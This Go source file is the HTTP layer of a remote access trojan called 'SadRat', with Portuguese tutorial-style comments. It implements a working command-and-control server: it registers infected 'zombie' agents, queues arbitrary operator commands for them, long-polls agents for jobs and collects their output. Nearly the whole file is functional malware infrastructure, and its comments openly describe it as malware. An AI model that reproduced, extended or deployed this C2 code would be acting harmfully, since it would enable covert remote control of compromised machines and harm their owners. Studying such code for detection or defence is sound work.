package presentation

import (
	"encoding/json"
	"net/http"
	"time"

	"github.com/VitorDie/SadRat/internal/domain"
)

// DTOs (Data Transfer Objects) - O formato exato que trafega na rede
type CreateJobRequest struct {
	AgentID string   `json:"agent_id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

// NOVO DTO: O que o Agente envia após executar o comando
type UpdateJobResultRequest struct {
	JobID  string `json:"job_id"`
	Output string `json:"output"`
}

// HandlerHTTP é a nossa Camada de Apresentação (o "Garçom").
// Repare que ele não conhece o banco de dados (serverDB), apenas a regra de negócio!
type HandlerHTTP struct {
	logic domain.Server
}

// NewHandlerHTTP constrói o roteador injetando a regra de negócio (Interface)
func NewHandlerHTTP(logic domain.Server) *HandlerHTTP {
	return &HandlerHTTP{logic: logic}
}

// Router configura todas as rotas do malware
func (h *HandlerHTTP) Router() *http.ServeMux {
	mux := http.NewServeMux()

	// Roteamento REST nativo do Go
	mux.HandleFunc("POST /api/agents", h.handleGiveAnUUIDForAgentRequest)
	mux.HandleFunc("POST /api/jobs", h.handleReceiveCommand)
	
	// STUBS das rotas (vamos implementar as lógicas nas próximas partes)
	mux.HandleFunc("GET /api/agents/{agent_id}/job", h.handleSendJobs)
	mux.HandleFunc("POST /api/jobs/result", h.handleReceiveJobResult)
	mux.HandleFunc("GET /api/jobs", h.handleSendAllJobResults)
	mux.HandleFunc("GET /api/jobs/{job_id}/result", h.handleSendJobResult)
	mux.HandleFunc("GET /api/agents", h.handleSendAvailableAgents)
	
	return mux
}

// Start IMPLEMENTA A INTERFACE domain.Handler
// Ele chama o Router internamente e, de fato, sobe o servidor web!
func (h *HandlerHTTP) Start(address string) error {
	roteador := h.Router()
	
	// O ListenAndServe sobe o servidor e passa a escutar no endereço recebido (ex: ":8080")
	return http.ListenAndServe(address, roteador)
}

// handleGiveAnUUIDForAgentRequest registra um novo zumbi
func (h *HandlerHTTP) handleGiveAnUUIDForAgentRequest(w http.ResponseWriter, r *http.Request) {
	// 1. O Garçom pede para a Cozinha (Service) registrar o agente.
	// A API não gera mais o UUID, ela apenas recebe a resposta limpa!
	uuid, err := h.logic.GiveAnUUIDForAgentRequest()
	if err != nil {
		http.Error(w, "Erro ao registrar agente", http.StatusInternalServerError)
		return
	}

	// 2. O Garçom formata a resposta para HTTP/JSON
	response := map[string]string{"uuid": uuid}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(response)
}

// handleReceiveCommand recebe o comando do Operador e agenda para o Agente
func (h *HandlerHTTP) handleReceiveCommand(w http.ResponseWriter, r *http.Request) {
	// 1. Decodificação do DTO (Decoding requests)
	var req CreateJobRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	// 2. Passamos os dados puros para o Cérebro (Service Layer) trabalhar.
	// A API não faz mais ideia do que é a entidade domain.JobRow!
	jobID, err := h.logic.ReceiveCommand(req.Command, req.Args, req.AgentID)
	if err != nil {
		http.Error(w, "Erro ao salvar comando", http.StatusInternalServerError)
		return
	}

	// 3. Codificação da Resposta (Encoding responses) com o ID gerado
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":       jobID,
		"agent_id": req.AgentID,
		"command":  req.Command,
		"args":     req.Args,
	})
}

// handleSendJobs é onde a mágica do Long Polling acontece
func (h *HandlerHTTP) handleSendJobs(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agent_id")

	// Long Polling: O C&C "prende" o Agente por até 5 segundos procurando comandos
	for i := 0; i < 5; i++ {
		// 1. O Garçom pergunta ao Cérebro se tem trabalho na fila
		jobRow, err := h.logic.SendJobs(agentID)
		
		// 2. Se não houver erro e o UUID não for vazio, achamos um comando!
		if err == nil && jobRow.ID != "" {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusOK)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"id":       jobRow.ID, // Alterado para UUID, como na nossa entidade!
				"command":  jobRow.Command,
				"args":     jobRow.Args,
			})
			return
		}

		// Se não achou, o C&C dorme 1 segundo e tenta de novo (sem gastar CPU)
		time.Sleep(1 * time.Second)
	}

	// Se passar os 5 segundos e não tiver comando, liberamos a conexão
	w.WriteHeader(http.StatusNoContent) // HTTP 204
}

// handleReceiveJobResult processa o output retornado pelo zumbi
func (h *HandlerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Request) {
	// 1. O Garçom anota o pedido (Decodifica o DTO)
	var req UpdateJobResultRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	// 2. A MÁGICA: O Garçom simplesmente joga os dados limpos para a Camada de Serviço!
	// Nada de "GetJob", "time.Now()" ou "UpdateJob" aqui na rota da web.
	if err := h.logic.ReceiveJobResult(req.JobID, req.Output); err != nil {
		http.Error(w, "Erro ao processar resultado", http.StatusInternalServerError)
		return
	}

	w.WriteHeader(http.StatusOK)
}

// handleSendAllJobResults lista todos os comandos para o Operador
func (h *HandlerHTTP) handleSendAllJobResults(w http.ResponseWriter, r *http.Request) {
	// 1. O Garçom pede o histórico completo para a Camada de Serviço
	jobs, err := h.logic.SendAllJobResults()
	if err != nil {
		http.Error(w, "Erro ao buscar comandos", http.StatusInternalServerError)
		return
	}

	// 2. Transforma as Entidades em JSON. 
	// O `json.NewEncoder` do Go sabe lidar perfeitamente com ponteiros nulos (*string)!
	var response []map[string]interface{}
	for _, j := range jobs {
		response = append(response, map[string]interface{}{
			"id":          j.ID, // Alterado para UUID
			"agent_id":    j.AgentID,
			"command":     j.Command,
			"args":        j.Args,
			"output":      j.Output, // Sendo um ponteiro, virará `null` no JSON caso não haja resposta ainda
			// "executed_at": j.ExecutedAt, (Mantenha se a sua struct JobRow tiver esse campo)
		})
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)
}

// handleSendJobResult devolve o output de um comando específico para o Operador
func (h *HandlerHTTP) handleSendJobResult(w http.ResponseWriter, r *http.Request) {
	jobID := r.PathValue("job_id") // Extrai o ID da URL

	// 1. O Garçom pede o resultado para a Cozinha (Camada de Serviço).
	// A MÁGICA: A API não lida mais com ponteiros (*string) e não sabe o que é a entidade JobRow!
	output, err := h.logic.SendJobResult(jobID)
	if err != nil {
		http.Error(w, "Comando não encontrado", http.StatusNotFound)
		return
	}

	// 2. Preparamos o DTO de resposta.
	// O Serviço retorna uma string vazia ("") caso o zumbi ainda não tenha respondido.
	var responseOutput interface{} = output
	if output == "" {
		responseOutput = nil // Mantemos o comportamento original de retornar `null` no JSON
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"output": responseOutput,
	})
}

// handleSendAvailableAgents lista todos os agentes infectados para o Operador
func (h *HandlerHTTP) handleSendAvailableAgents(w http.ResponseWriter, r *http.Request) {
	// 1. O Garçom simplesmente pede a lista de agentes vivos ao Cérebro
	agents, err := h.logic.SendAvailableAgents()
	if err != nil {
		http.Error(w, "Erro ao buscar agentes", http.StatusInternalServerError)
		return
	}

	// 2. Transformamos as Entidades de Domínio em JSON (Array de DTOs)
	// Como você implementou UUID na estrutura, acessamos diretamente a.UUID
	var response []map[string]interface{}
	for _, a := range agents {
		response = append(response, map[string]interface{}{
			"id": a.UUID,
		})
	}

	// Boa prática: se não houver zumbis, garantimos que o JSON retorne `[]` em vez de `null`
	if response == nil {
		response = make([]map[string]interface{}, 0)
	}

	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(response)
}